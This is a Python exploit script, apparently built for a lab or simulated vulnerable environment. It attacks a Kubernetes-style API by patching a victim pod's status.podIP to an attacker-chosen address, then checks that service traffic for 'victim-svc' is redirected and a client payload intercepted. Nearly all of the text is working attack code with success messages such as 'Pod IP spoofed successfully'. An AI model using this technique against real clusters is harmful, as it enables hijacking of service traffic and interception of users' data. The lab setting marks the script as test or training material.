import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Spoofing Pod IP via status.podIP Patch request")
    status_patch = {
        "status": {
            "podIP": "10.244.9.99"
        }
    }

    try:
        headers = {"Content-Type": "application/strategic-merge-patch+json"}
        resp = requests.patch(
            f"{url}/api/v1/namespaces/default/pods/victim-pod/status",
            json=status_patch,
            headers=headers,
            timeout=10
        )
        if resp.status_code == 200:
            print("[+] Pod IP spoofed successfully!")
            print(f"[+] Hijacked status config: {resp.json()}")
        else:
            print(f"[-] Status patch failed with status code {resp.status_code}")
            return
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return

    print("[*] Phase 2: Verifying service traffic now routes to attacker-controlled IP")
    try:
        resp = requests.post(
            f"{url}/simulate/service-traffic",
            json={"service": "victim-svc", "client_payload": "GET /api/data HTTP/1.1"},
            timeout=10
        )
        if resp.status_code == 200:
            result = resp.json()
            print(f"[+] Traffic redirect confirmed!")
            print(f"[+] Service 'victim-svc' now routes to: {result.get('routed_to_ip')}")
            print(f"[+] Attacker IP is: {result.get('attacker_ip')}")
            print(f"[+] Client payload intercepted: {result.get('intercepted_payload')}")
        else:
            print(f"[-] Traffic simulation failed: {resp.status_code}")
    except Exception as e:
        print(f"[-] Traffic simulation request failed: {e}")
